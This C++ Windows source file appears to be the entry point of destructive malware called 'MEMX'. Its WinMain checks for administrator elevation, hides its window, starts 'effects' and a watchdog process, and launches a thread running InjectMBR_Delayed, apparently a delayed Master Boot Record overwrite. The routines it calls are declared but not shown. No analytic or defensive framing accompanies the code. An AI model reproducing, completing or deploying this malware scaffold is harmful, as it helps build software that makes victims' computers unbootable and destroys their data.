#include <windows.h>
#include <tlhelp32.h>
#include <vector>
#include <string>
#include <cstdio>

#pragma comment(linker, "/SUBSYSTEM:WINDOWS")
#pragma comment(linker, "/ENTRY:WinMainCRTStartup")

volatile bool g_running = true;

extern void StartEffects();
extern void StartWatchdog();
extern void InjectMBR_Delayed();

BOOL IsAdmin() {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) return FALSE;
    DWORD size = 0;
    GetTokenInformation(hToken, TokenElevationType, NULL, 0, &size);
    if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
        CloseHandle(hToken);
        return FALSE;
    }
    BYTE* buffer = (BYTE*)malloc(size);
    if (!buffer) {
        CloseHandle(hToken);
        return FALSE;
    }
    BOOL elevated = FALSE;
    if (GetTokenInformation(hToken, TokenElevationType, buffer, size, &size)) {
        TOKEN_ELEVATION_TYPE* elev = (TOKEN_ELEVATION_TYPE*)buffer;
        elevated = (*elev == TokenElevationTypeFull);
    }
    free(buffer);
    CloseHandle(hToken);
    return elevated;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                   LPSTR lpCmdLine, int nCmdShow) {
    
    if (strstr(lpCmdLine, "/watchdog")) {
        while (TRUE) Sleep(5000);
        return 0;
    }
    
    if (!IsAdmin()) {
        MessageBoxA(NULL, "Run as administrator!", "MEMX", MB_ICONERROR);
        return 1;
    }
    
    WNDCLASSA wc = {0};
    wc.lpfnWndProc = DefWindowProcA;
    wc.hInstance = hInstance;
    wc.lpszClassName = "MEMXClass";
    RegisterClassA(&wc);
    
    HWND hwnd = CreateWindowExA(0, "MEMXClass", "MEMX",
        WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT,
        1, 1, NULL, NULL, hInstance, NULL);
    ShowWindow(hwnd, SW_HIDE);
    
    StartEffects();
    StartWatchdog();
    
    HANDLE hThread = CreateThread(NULL, 0, 
        (LPTHREAD_START_ROUTINE)InjectMBR_Delayed, 
        NULL, 0, NULL);
    CloseHandle(hThread);
    
    MSG msg;
    while (g_running && GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    return 0;
}